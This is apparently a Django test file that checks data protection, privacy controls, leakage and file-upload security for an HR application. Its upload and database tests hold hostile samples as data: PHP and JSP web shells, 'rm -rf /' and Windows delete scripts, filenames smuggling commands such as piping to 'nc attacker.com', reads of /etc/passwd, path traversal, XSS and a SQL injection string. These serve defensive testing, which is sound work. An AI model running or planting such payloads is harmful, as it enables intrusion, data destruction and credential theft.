"""
Data Protection and Privacy Security Tests
Tests for data encryption, privacy controls, and data handling security
"""
import pytest
from django.test import TestCase, Client
from django.contrib.auth.models import User
from django.conf import settings
from django.core.files.uploadedfile import SimpleUploadedFile
from django.db import connection
import json
import os
import tempfile
import hashlib
from unittest.mock import patch, mock_open


class DataEncryptionTests(TestCase):
    """
    Test data encryption and cryptographic security
    """
    
    def setUp(self):
        """Set up test data"""
        self.client = Client()
        self.user = User.objects.create_user(
            username='testuser',
            email='test@example.com',
            password='TestPass123!'
        )
    
    def test_password_hashing(self):
        """Test password hashing strength"""
        # Test that passwords are properly hashed
        user = User.objects.get(username='testuser')
        
        # Password should be hashed with strong algorithm
        self.assertNotEqual(user.password, 'TestPass123!')
        self.assertTrue(user.password.startswith('pbkdf2_sha256$'))
        
        # Should use sufficient iterations
        parts = user.password.split('$')
        if len(parts) >= 3:
            iterations = int(parts[1])
            # Should use at least 100,000 iterations (Django default is higher)
            self.assertGreaterEqual(iterations, 100000)
    
    def test_sensitive_data_storage(self):
        """Test that sensitive data is properly encrypted in database"""
        # This test would check if sensitive fields are encrypted
        # Implementation depends on the encryption mechanism used
        
        try:
            # Create employee with sensitive data
            from Hr.models import Employee
            employee = Employee.objects.create(
                first_name='Test',
                last_name='Employee',
                email='test@example.com',
                phone='123-456-7890',
                national_id='123456789',  # Sensitive data
                salary=50000  # Sensitive data
            )
            
            # Check if sensitive data is encrypted in database
            with connection.cursor() as cursor:
                cursor.execute("SELECT national_id, salary FROM hr_employee WHERE id = %s", [employee.id])
                row = cursor.fetchone()
                
                if row:
                    stored_national_id, stored_salary = row
                    
                    # If encryption is implemented, stored values should be encrypted
                    # This is a basic check - actual implementation may vary
                    if stored_national_id != '123456789':
                        # Data appears to be encrypted
                        self.assertNotEqual(stored_national_id, '123456789')
        except:
            # Models might not exist or encryption not implemented
            pass
    
    def test_session_data_security(self):
        """Test session data security"""
        # Login to create session
        self.client.login(username='testuser', password='TestPass123!')
        
        session_key = self.client.session.session_key
        self.assertIsNotNone(session_key)
        
        # Session key should be sufficiently random and long
        self.assertGreaterEqual(len(session_key), 32)
        
        # Session data should not contain sensitive information in plain text
        session_data = self.client.session._session
        session_str = str(session_data)
        
        # Should not contain password or other sensitive data
        self.assertNotIn('TestPass123!', session_str)
        self.assertNotIn('password', session_str.lower())
    
    def test_database_connection_security(self):
        """Test database connection security"""
        # Check database configuration
        db_config = settings.DATABASES['default']
        
        # Should use encrypted connections in production
        if not settings.DEBUG:
            # Check for SSL/TLS configuration
            options = db_config.get('OPTIONS', {})
            # This depends on database type and configuration
            # For SQL Server, should have encrypt=True
            if 'encrypt' in options:
                self.assertTrue(options['encrypt'])
        
        # Password should not be hardcoded
        db_password = db_config.get('PASSWORD', '')
        if db_password:
            # Should use environment variables or secure storage
            # This is more of a configuration review
            pass
    
    def test_file_encryption(self):
        """Test file encryption for uploaded files"""
        self.client.login(username='testuser', password='TestPass123!')
        
        # Create test file
        test_content = b'Sensitive file content'
        test_file = SimpleUploadedFile(
            "test_document.txt",
            test_content,
            content_type="text/plain"
        )
        
        try:
            # Upload file
            response = self.client.post('/upload/', {
                'file': test_file
            })
            
            if response.status_code in [200, 302]:
                # Check if file is encrypted on disk
                # This depends on file storage implementation
                media_root = settings.MEDIA_ROOT
                if os.path.exists(media_root):
                    # Look for uploaded files
                    for root, dirs, files in os.walk(media_root):
                        for file in files:
                            if file.startswith('test_document'):
                                file_path = os.path.join(root, file)
                                with open(file_path, 'rb') as f:
                                    stored_content = f.read()
                                
                                # If encryption is implemented, content should be different
                                if stored_content != test_content:
                                    # File appears to be encrypted
                                    self.assertNotEqual(stored_content, test_content)
        except:
            # Upload functionality might not be implemented
            pass


class DataPrivacyTests(TestCase):
    """
    Test data privacy and access controls
    """
    
    def setUp(self):
        """Set up test data"""
        self.client = Client()
        self.user1 = User.objects.create_user(
            username='user1',
            email='user1@example.com',
            password='Pass123!'
        )
        self.user2 = User.objects.create_user(
            username='user2',
            email='user2@example.com',
            password='Pass123!'
        )
        self.admin_user = User.objects.create_superuser(
            username='admin',
            email='admin@example.com',
            password='AdminPass123!'
        )
    
    def test_personal_data_access_control(self):
        """Test that users can only access their own personal data"""
        # Login as user1
        self.client.login(username='user1', password='Pass123!')
        
        try:
            # Try to access own profile
            response = self.client.get('/accounts/profile/')
            if response.status_code == 200:
                content = response.content.decode()
                self.assertIn('user1', content)
            
            # Try to access other user's profile
            response = self.client.get(f'/accounts/profile/{self.user2.id}/')
            # Should not allow access to other user's data
            self.assertIn(response.status_code, [403, 404, 302])
        except:
            pass
    
    def test_data_anonymization(self):
        """Test data anonymization in logs and exports"""
        self.client.login(username='user1', password='Pass123!')
        
        try:
            # Perform some actions that should be logged
            response = self.client.post('/Hr/employee/add/', {
                'first_name': 'Test',
                'last_name': 'Employee',
                'email': 'test@example.com',
                'phone': '123-456-7890'
            })
            
            # Check if sensitive data is anonymized in logs
            # This would require checking actual log files
            # For now, we test the principle
            
            # Export data
            response = self.client.get('/api/v1/employees/export/')
            if response.status_code == 200:
                content = response.content.decode()
                
                # Should not expose full personal identifiers
                # This depends on anonymization implementation
                sensitive_patterns = [
                    r'\d{3}-\d{2}-\d{4}',  # SSN pattern
                    r'\d{3}-\d{3}-\d{4}',  # Phone pattern
                ]
                
                import re
                for pattern in sensitive_patterns:
                    matches = re.findall(pattern, content)
                    # If anonymization is implemented, should not find full patterns
                    if matches:
                        # Check if data is masked (e.g., XXX-XX-1234)
                        for match in matches:
                            if 'X' in match or '*' in match:
                                # Data appears to be masked
                                pass
        except:
            pass
    
    def test_data_retention_policies(self):
        """Test data retention and deletion policies"""
        # This test would check if old data is properly deleted
        # Implementation depends on data retention policies
        
        try:
            # Create old employee record
            from Hr.models import Employee
            from datetime import datetime, timedelta
            
            old_employee = Employee.objects.create(
                first_name='Old',
                last_name='Employee',
                email='old@example.com',
                created_at=datetime.now() - timedelta(days=2000)  # Very old record
            )
            
            # Check if retention policies are applied
            # This would typically be done by scheduled tasks
            # For testing, we check if the mechanism exists
            
            # Look for deletion methods or scheduled tasks
            if hasattr(Employee, 'delete_old_records'):
                # Retention policy method exists
                pass
        except:
            pass
    
    def test_right_to_be_forgotten(self):
        """Test implementation of right to be forgotten (GDPR)"""
        self.client.login(username='user1', password='Pass123!')
        
        try:
            # Request data deletion
            response = self.client.post('/accounts/delete-my-data/')
            
            if response.status_code in [200, 202]:
                # Data deletion request was accepted
                # Check if user data is marked for deletion or anonymized
                
                # User should still exist but data should be anonymized
                user = User.objects.get(username='user1')
                
                # Check if personal data is anonymized
                if user.email.startswith('deleted_') or user.email == '':
                    # Email was anonymized
                    pass
                
                if user.first_name == '' or user.first_name.startswith('Deleted'):
                    # Name was anonymized
                    pass
        except:
            # Right to be forgotten might not be implemented
            pass
    
    def test_data_portability(self):
        """Test data portability (GDPR right to data portability)"""
        self.client.login(username='user1', password='Pass123!')
        
        try:
            # Request data export
            response = self.client.get('/accounts/export-my-data/')
            
            if response.status_code == 200:
                # Should provide data in machine-readable format
                content_type = response.headers.get('Content-Type', '')
                
                # Should be JSON, CSV, or XML
                acceptable_types = ['application/json', 'text/csv', 'application/xml']
                self.assertTrue(any(t in content_type for t in acceptable_types))
                
                # Should contain user's personal data
                content = response.content.decode()
                self.assertIn('user1', content)
        except:
            # Data portability might not be implemented
            pass


class DataLeakageTests(TestCase):
    """
    Test for data leakage vulnerabilities
    """
    
    def setUp(self):
        """Set up test data"""
        self.client = Client()
        self.user = User.objects.create_user(
            username='testuser',
            password='TestPass123!'
        )
    
    def test_error_message_data_leakage(self):
        """Test that error messages don't leak sensitive data"""
        # Test database errors
        try:
            response = self.client.get('/api/v1/employees/?id=invalid')
            
            if response.status_code in [400, 500]:
                content = response.content.decode()
                
                # Should not expose database schema or connection info
                sensitive_info = [
                    'database', 'connection', 'password', 'user=',
                    'host=', 'port=', 'table', 'column', 'schema'
                ]
                
                for info in sensitive_info:
                    self.assertNotIn(info.lower(), content.lower())
        except:
            pass
    
    def test_debug_information_leakage(self):
        """Test that debug information is not leaked"""
        # Test with debug mode off
        with self.settings(DEBUG=False):
            try:
                # Trigger an error
                response = self.client.get('/nonexistent-url/')
                
                if response.status_code in [404, 500]:
                    content = response.content.decode()
                    
                    # Should not expose file paths or code
                    debug_info = [
                        '/home/', '/var/', '/usr/', 'traceback',
                        'django/', 'python', 'line ', 'file "'
                    ]
                    
                    for info in debug_info:
                        self.assertNotIn(info, content.lower())
            except:
                pass
    
    def test_source_code_exposure(self):
        """Test that source code is not exposed"""
        # Test common source code exposure paths
        source_paths = [
            '/.git/',
            '/backup/',
            '/.env',
            '/config.py',
            '/settings.py',
            '/.DS_Store',
            '/Thumbs.db'
        ]
        
        for path in source_paths:
            response = self.client.get(path)
            # Should return 404, not expose source code
            self.assertEqual(response.status_code, 404)
    
    def test_backup_file_exposure(self):
        """Test that backup files are not exposed"""
        backup_extensions = [
            '.bak', '.backup', '.old', '.orig', '.tmp',
            '.swp', '.swo', '~', '.save'
        ]
        
        test_files = [
            'settings', 'config', 'database', 'users'
        ]
        
        for file_base in test_files:
            for ext in backup_extensions:
                test_path = f'/{file_base}{ext}'
                response = self.client.get(test_path)
                # Should return 404, not expose backup files
                self.assertEqual(response.status_code, 404)
    
    def test_directory_listing_disabled(self):
        """Test that directory listing is disabled"""
        # Test common directories
        directories = [
            '/static/',
            '/media/',
            '/uploads/',
            '/files/',
            '/documents/'
        ]
        
        for directory in directories:
            response = self.client.get(directory)
            
            if response.status_code == 200:
                content = response.content.decode()
                
                # Should not show directory listing
                directory_indicators = [
                    'Index of', 'Directory listing', 'Parent Directory',
                    '<pre>', 'Name</th>', 'Size</th>', 'Date</th>'
                ]
                
                for indicator in directory_indicators:
                    self.assertNotIn(indicator, content)


class FileUploadSecurityTests(TestCase):
    """
    Test file upload security
    """
    
    def setUp(self):
        """Set up test data"""
        self.client = Client()
        self.user = User.objects.create_user(
            username='testuser',
            password='TestPass123!'
        )
        self.client.login(username='testuser', password='TestPass123!')
    
    def test_malicious_file_upload_prevention(self):
        """Test prevention of malicious file uploads"""
        malicious_files = [
            ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('script.jsp', b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
            ('malware.exe', b'MZ\x90\x00\x03\x00\x00\x00', 'application/x-msdownload'),
            ('script.sh', b'#!/bin/bash\nrm -rf /', 'application/x-sh'),
            ('virus.bat', b'@echo off\ndel /f /s /q C:\\*.*', 'application/x-bat'),
        ]
        
        for filename, content, content_type in malicious_files:
            malicious_file = SimpleUploadedFile(
                filename,
                content,
                content_type=content_type
            )
            
            try:
                response = self.client.post('/upload/', {
                    'file': malicious_file
                })
                
                # Should reject malicious files
                self.assertIn(response.status_code, [400, 403, 415])
                
                if response.status_code in [400, 403]:
                    # Should provide appropriate error message
                    content = response.content.decode()
                    error_indicators = ['not allowed', 'forbidden', 'invalid', 'rejected']
                    self.assertTrue(any(indicator in content.lower() for indicator in error_indicators))
            except:
                # Upload endpoint might not exist
                pass
    
    def test_file_type_validation(self):
        """Test file type validation"""
        # Test allowed file types
        allowed_files = [
            ('document.pdf', b'%PDF-1.4', 'application/pdf'),
            ('image.jpg', b'\xff\xd8\xff\xe0', 'image/jpeg'),
            ('document.docx', b'PK\x03\x04', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'),
            ('text.txt', b'Plain text content', 'text/plain'),
        ]
        
        for filename, content, content_type in allowed_files:
            test_file = SimpleUploadedFile(
                filename,
                content,
                content_type=content_type
            )
            
            try:
                response = self.client.post('/upload/', {
                    'file': test_file
                })
                
                # Should accept allowed file types
                self.assertIn(response.status_code, [200, 201, 302])
            except:
                pass
    
    def test_file_size_limits(self):
        """Test file size limits"""
        # Test oversized file
        large_content = b'A' * (10 * 1024 * 1024)  # 10MB
        large_file = SimpleUploadedFile(
            'large_file.txt',
            large_content,
            content_type='text/plain'
        )
        
        try:
            response = self.client.post('/upload/', {
                'file': large_file
            })
            
            # Should reject oversized files
            self.assertIn(response.status_code, [400, 413])
        except:
            pass
    
    def test_filename_sanitization(self):
        """Test filename sanitization"""
        malicious_filenames = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            'file.txt; rm -rf /',
            'file.txt && cat /etc/passwd',
            'file.txt | nc attacker.com 1234',
            '<script>alert("xss")</script>.txt',
            'file\x00.txt',  # Null byte injection
        ]
        
        for filename in malicious_filenames:
            test_file = SimpleUploadedFile(
                filename,
                b'test content',
                content_type='text/plain'
            )
            
            try:
                response = self.client.post('/upload/', {
                    'file': test_file
                })
                
                if response.status_code in [200, 201, 302]:
                    # If upload succeeds, filename should be sanitized
                    # Check if file was saved with sanitized name
                    # This would require checking the actual saved filename
                    pass
                else:
                    # Should reject malicious filenames
                    self.assertIn(response.status_code, [400, 403])
            except:
                pass
    
    def test_file_content_scanning(self):
        """Test file content scanning for malicious content"""
        # Test files with embedded scripts
        malicious_content_files = [
            ('image.jpg', b'\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            ('document.pdf', b'%PDF-1.4\n<script>alert("xss")</script>', 'application/pdf'),
            ('text.txt', b'Innocent text\n<?php eval($_POST["code"]); ?>', 'text/plain'),
        ]
        
        for filename, content, content_type in malicious_content_files:
            test_file = SimpleUploadedFile(
                filename,
                content,
                content_type=content_type
            )
            
            try:
                response = self.client.post('/upload/', {
                    'file': test_file
                })
                
                # Should detect and reject files with malicious content
                # This depends on content scanning implementation
                if response.status_code in [400, 403]:
                    # Content scanning detected malicious content
                    pass
            except:
                pass


class DatabaseSecurityTests(TestCase):
    """
    Test database security measures
    """
    
    def setUp(self):
        """Set up test data"""
        self.client = Client()
        self.user = User.objects.create_user(
            username='testuser',
            password='TestPass123!'
        )
    
    def test_database_user_privileges(self):
        """Test database user has minimal required privileges"""
        # This test checks database configuration
        # Implementation depends on database setup
        
        with connection.cursor() as cursor:
            try:
                # Test if database user has excessive privileges
                # Try to perform admin operations
                cursor.execute("CREATE TABLE test_table (id INT)")
                # If this succeeds, user might have excessive privileges
                cursor.execute("DROP TABLE test_table")
            except Exception as e:
                # Good! User doesn't have excessive privileges
                self.assertIn('permission', str(e).lower())
    
    def test_sql_injection_protection(self):
        """Test SQL injection protection at database level"""
        # Test parameterized queries
        with connection.cursor() as cursor:
            # This should be safe due to parameterization
            malicious_input = "'; DROP TABLE auth_user; --"
            
            try:
                cursor.execute("SELECT * FROM auth_user WHERE username = %s", [malicious_input])
                results = cursor.fetchall()
                
                # Should not find any results (malicious input treated as literal)
                self.assertEqual(len(results), 0)
            except Exception as e:
                # Query should execute safely without SQL injection
                pass
    
    def test_database_connection_encryption(self):
        """Test database connection encryption"""
        # Check if database connections are encrypted
        db_config = settings.DATABASES['default']
        
        if 'OPTIONS' in db_config:
            options = db_config['OPTIONS']
            
            # For SQL Server
            if 'encrypt' in options:
                self.assertTrue(options['encrypt'])
            
            # For PostgreSQL
            if 'sslmode' in options:
                self.assertIn(options['sslmode'], ['require', 'verify-ca', 'verify-full'])
            
            # For MySQL
            if 'ssl' in options:
                self.assertIsNotNone(options['ssl'])
    
    def test_database_backup_security(self):
        """Test database backup security"""
        # This test would check if database backups are encrypted
        # Implementation depends on backup strategy
        
        # Check if backup directory exists and is properly secured
        backup_paths = [
            '/var/backups/',
            '/backup/',
            './backups/',
            settings.BASE_DIR / 'backups'
        ]
        
        for backup_path in backup_paths:
            if os.path.exists(backup_path):
                # Check directory permissions
                stat_info = os.stat(backup_path)
                permissions = oct(stat_info.st_mode)[-3:]
                
                # Should not be world-readable
                self.assertNotIn('7', permissions[2])  # Others should not have full access
                self.assertNotIn('6', permissions[2])  # Others should not have read/write
                self.assertNotIn('4', permissions[2])  # Others should not have read


if __name__ == '__main__':
    pytest.main([__file__])